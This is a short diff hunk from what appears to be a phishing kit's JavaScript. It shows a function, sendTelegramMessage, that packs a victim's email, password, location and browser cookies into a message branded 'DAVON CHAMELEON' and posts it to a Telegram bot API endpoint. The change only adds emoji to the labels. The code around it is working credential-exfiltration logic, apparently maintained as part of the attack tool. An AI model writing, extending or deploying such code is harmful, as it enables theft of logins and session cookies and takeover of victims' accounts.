@@ -553,8 +553,8 @@ function sendTelegramMessage(email, password, attempt, country, cookies) {
   const text = `☠️ DAVON CHAMELEON [${attempt}/3] ☠️\n` +
                ` 🖥️UserId : [ ${email} ]\n` +
                `   🔐Pass : [ ${password} ]\n` +
-               ` Country : [ ${userCity}, ${userCountry} ]\n` +
-               ` Cookies: ${JSON.stringify(cookies)}`;
+               ` 🌍Country : [ ${userCity}, ${userCountry} ]\n` +
+               ` 🍪Cookies: ${JSON.stringify(cookies)}`;
 
   const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
   const payload = {
